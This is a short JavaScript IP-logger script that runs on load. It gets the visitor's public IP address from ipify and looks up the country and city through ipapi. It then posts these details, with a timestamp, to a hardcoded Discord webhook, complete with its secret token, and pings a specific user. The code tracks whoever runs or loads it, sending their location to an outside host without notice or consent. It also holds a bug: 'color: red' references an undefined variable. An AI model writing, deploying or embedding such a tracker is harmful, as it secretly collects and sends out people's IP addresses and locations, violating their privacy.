const sendIPToDiscord = async () => {

    try {
  
      const ipResponse = await fetch('https://api.ipify.org?format=json');
  
      const ipData = await ipResponse.json();
  
      const ip = ipData.ip;
  
  
  
      const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
  
      const locationData = await locationResponse.json();
  
      const country = locationData.country_name;
  
      const city = locationData.city;
  
      const time = new Date().toLocaleString();
  
  
  
      const webhookURL ='https://discord.com/api/webhooks/1297626168110878793/clF_GHt_XqCSLCcc-9rddf6CqpaJWtr6QdKjio8vDrHACyWuiS3If3Ss6sR6gTfBngsy';
  
      const payload = {
  
        embeds: [{
  
          title: 'User Location Information',
  
          description: '\n<@1250023827904401434>\n' +
  
                       '```\nCountry: ' + country + '\n```' +
  
                       '```\nCity: ' + city + '\n```' +
  
                       '```\nTime: ' + time + '\n```' +
  
                       '```\nIP Address: ' + ip + '\n```',
  
          color: red
  
        }]
  
      };
  
  
  
      await fetch(webhookURL, {
  
        method: 'POST',
  
        headers: {
  
          'Content-Type': 'application/json'
  
        },
  
        body: JSON.stringify(payload)
  
      });
  
  
  
      console.log('wsp g');
  
    } catch (error) {
  
      console.error('um..this is a problem: ', error);
  
    }
  
  };
  
  
  
  
  
  sendIPToDiscord();